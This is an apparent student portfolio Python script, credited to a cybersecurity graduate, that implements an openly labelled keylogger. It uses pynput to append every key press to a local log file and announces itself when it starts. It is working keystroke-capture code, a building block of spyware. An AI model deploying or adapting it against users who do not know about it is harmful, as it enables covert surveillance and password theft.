"""
Ikramul Molla is a fresher with a background in Cyber Security and Computer Science.
Ikramul Molla holds a Bachelor of Technology (B.Tech) degree in Cyber Security and a Diploma in Computer Science and Technology, both from Budge Budge Institute of Technology.

Keylogger Program:
This program logs alphanumeric keys and special keys using Python's pynput library.
"""

from pynput import keyboard

# Define the file to store the logged keys
log_file = "key_log.txt"


def on_press(key):
    try:
        if hasattr(key, 'char'):
            # Check if key has a printable character
            if key.char is not None and key.char.isdigit():
                # Write the character to the log file
                with open(log_file, "a") as f:
                    f.write(key.char)
            else:
                # Handle special keys and non-printable characters
                special_key_map = {
                    keyboard.Key.space: " ",
                    keyboard.Key.enter: "\n",
                    keyboard.Key.backspace: "[BACKSPACE]",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.esc: "[ESC]",
                    keyboard.Key.shift: "[SHIFT]",
                    keyboard.Key.ctrl: "[CTRL]",
                    keyboard.Key.alt: "[ALT]",
                    keyboard.Key.cmd: "[CMD]",
                    keyboard.Key.delete: "[DELETE]",
                    keyboard.Key.home: "[HOME]",
                    keyboard.Key.end: "[END]",
                    keyboard.Key.page_up: "[PAGE UP]",
                    keyboard.Key.page_down: "[PAGE DOWN]",
                    keyboard.Key.up: "[UP]",
                    keyboard.Key.down: "[DOWN]",
                    keyboard.Key.left: "[LEFT]",
                    keyboard.Key.right: "[RIGHT]",
                }
                if key in special_key_map:
                    with open(log_file, "a") as f:
                        f.write(special_key_map[key])
                else:
                    with open(log_file, "a") as f:
                        f.write(f" [{key}] ")

        else:
            # Handle special keys without a `char` attribute
            special_key_map = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl: "[CTRL]",
                keyboard.Key.alt: "[ALT]",
                keyboard.Key.cmd: "[CMD]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PAGE UP]",
                keyboard.Key.page_down: "[PAGE DOWN]",
                keyboard.Key.up: "[UP]",
                keyboard.Key.down: "[DOWN]",
                keyboard.Key.left: "[LEFT]",
                keyboard.Key.right: "[RIGHT]",
            }
            if key in special_key_map:
                with open(log_file, "a") as f:
                    f.write(special_key_map[key])
            else:
                with open(log_file, "a") as f:
                    f.write(f" [{key}] ")

        # Add a newline for readability in the log file
        with open(log_file, "a") as f:
            f.write("\n")

    except Exception as e:
        print(f"Error: {str(e)}")


def on_release(key):
    # Stop listener on pressing the escape key
    if key == keyboard.Key.esc:
        return False


# Display information when the program starts
print("Welcome to the Keylogger Program")
print("This program logs alphanumeric keys and special keys.")
print("Created by Ikramul Molla.")
print()

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
